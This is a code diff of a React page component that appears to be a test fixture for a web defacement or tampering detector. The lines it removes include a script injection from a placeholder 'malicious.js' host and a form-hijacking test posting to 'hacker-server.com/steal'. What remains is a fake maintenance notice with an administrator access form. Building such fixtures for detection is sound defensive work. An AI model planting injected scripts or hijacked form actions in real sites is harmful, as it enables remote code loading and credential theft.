@@ -1,28 +1,19 @@
-import React, { useEffect } from 'react';
+import React from 'react';
 
 /**
- * MainContent - Layer 1 Full Stress Test (Fixed Syntax)
+ * MainContent - Text Change Stress Test Version
+ *
+ * Focus:
+ * - Replacing headlines
+ * - Changing body text
+ * - Modifying labels/buttons
+ * - Rewriting large content blocks
  */
-const MainContent = () => {
-  
-  // Properly inject the malicious script into the DOM for detector testing
-  useEffect(() => {
-    const script = document.createElement("script");
-    script.src = "https://unknown-cdn.com/malicious.js";
-    script.id = "malicious-script-trigger";
-    script.async = true;
-    document.body.appendChild(script);
-    
-    return () => {
-      const el = document.getElementById("malicious-script-trigger");
-      if (el) document.body.removeChild(el);
-    };
-  }, []);
 
+const MainContent = () => {
   return (
     <div className="defaced-root" id="layer1-pwned-zone">
 
-      {/* HEADER SECTION */}
       <header
         className="hacked-header"
         style={{
@@ -32,25 +23,65 @@ const MainContent = () => {
           textAlign: 'center',
         }}
       >
-        <h5 style={{ fontSize: '3rem', marginBottom: '10px' }}>
+        {/* HEADLINE CHANGE */}
+        <h1 style={{ fontSize: '3rem', marginBottom: '10px' }}>
           PLATFORM MAINTENANCE ACTIVE
-        </h5>
+        </h1>
 
         <h2 style={{ fontWeight: 'normal' }}>
-          Hacker
+          User services are temporarily operating in restricted mode
         </h2>
       </header>
 
-      {/* MAIN SECTION */}
       <main className="content-purge" style={{ padding: '30px' }}>
+
+        {/* BODY TEXT CHANGES */}
         <p>
-          This platform is currently undergoing infrastructure upgrades
-          and authentication system maintenance.
+          We are currently performing a large-scale infrastructure migration
+          to improve application reliability, authentication performance,
+          and long-term scalability.
         </p>
 
-        {/* TEST: Form Hijacking (action change) */}
-        {/* <form 
-          action="https://hacker-server.com/steal" 
+        <p>
+          During this maintenance period, some dashboard modules,
+          verification systems, and account management tools may
+          respond more slowly than expected.
+        </p>
+
+        <p>
+          Our engineering team is actively monitoring service health
+          and applying configuration updates across production systems.
+        </p>
+
+        {/* LARGE CONTENT REWRITE */}
+        <section
+          style={{
+            background: '#1b1b1b',
+            color: '#f5f5f5',
+            padding: '25px',
+            borderRadius: '8px',
+            marginTop: '30px',
+          }}
+        >
+          <h3>Infrastructure Update Notice</h3>
+
+          <p>
+            Several backend services are being redeployed as part of
+            a scheduled modernization initiative. This includes API
+            routing improvements, database optimization procedures,
+            and internal authentication policy upgrades.
+          </p>
+
+          <p>
+            Users may experience temporary interruptions while
+            synchronization tasks complete across distributed regions.
+            We appreciate your patience while these updates are finalized.
+          </p>
+        </section>
+
+        {/* MODIFIED FORM LABELS + BUTTONS */}
+        <form
+          action="/verify"
           method="POST"
           style={{
             margin: '40px 0',
@@ -58,7 +89,7 @@ const MainContent = () => {
             padding: '20px',
             borderRadius: '6px',
           }}
-        > */}
+        >
           <h3>Administrator Access Validation</h3>
 
           <label
@@ -94,22 +125,21 @@ const MainContent = () => {
         </form>
       </main>
 
-      {/* STRUCTURAL NOISE (For TED testing) */}
-      // <div
-      //   className="structural-noise"
-      //   aria-hidden="true"
-      //   style={{ opacity: 0, height: 0 }}
-      // >
-      //   {Array.from({ length: 400 }).map((_, i) => (
-      //     <section key={i} className={`anomaly-block-v4-${i}`}>
-      //       <span id={`drift-id-${i}`}>
-      //         STRUCTURAL_ENTROPY_ACTIVE
-      //       </span>
-      //     </section>
-      //   ))}
-      // </div>
+      {/* Structural filler */}
+      <div
+        className="structural-noise"
+        aria-hidden="true"
+        style={{ opacity: 0, height: 0 }}
+      >
+        {Array.from({ length: 400 }).map((_, i) => (
+          <section key={i} className={`anomaly-block-v4-${i}`}>
+            <span id={`drift-id-${i}`}>
+              STRUCTURAL_ENTROPY_ACTIVE
+            </span>
+          </section>
+        ))}
+      </div>
 
-      {/* FOOTER SECTION */}
       <footer
         className="footer-void"
         style={{
